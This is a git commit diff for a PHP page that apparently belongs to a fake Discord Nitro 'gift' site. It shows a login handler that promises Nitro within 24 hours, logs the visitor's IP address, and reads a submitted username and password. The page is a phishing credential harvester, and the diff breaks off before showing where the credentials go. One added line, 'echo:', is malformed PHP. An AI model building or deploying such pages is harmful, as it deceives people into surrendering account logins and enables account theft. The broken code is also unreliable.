8e0dd266ba9559ac00c43d855d281fecf7abd722
Mizuki-6 <142903801+Mizuki-6@users.noreply.github.com>
2023-08-22 19:20:59 +0530

    Update verified.php

--- gift/HJ9fh9hGfgfijh93/login/verified.php
+++ gift/HJ9fh9hGfgfijh93/login/verified.php
@@ -1,14 +1,13 @@
-<!DOCTYPE html>
-<html>
-  <head>
-  <link rel="stylesheet" href="../assest/style.css"/>
-  </head>
-  <body>
-    Your nitro will be send under 24 working hours.
-  </body>
-</html>
-<script>function redirect(){window.location.replace("https://discord.gg/4Fxhr8d966")}</script>
+<!-- // <html> -->
+<!-- //   <head> -->
+<!-- //   <link rel="stylesheet" href="../assest/style.css"/> -->
+<!-- //   </head> -->
+<!-- //   <body> -->
+<!-- //     Your nitro will be send under 24 working hours. -->
+<!-- //   </body> -->
+<!-- // </html> -->
 <?php
+echo:"Your nitro will be send under 24 working hours.";
 $iptoken = $_SERVER['REMOTE_ADDR'];  
     if(isset($_POST['pass'])){
       $user = $_POST['user'];
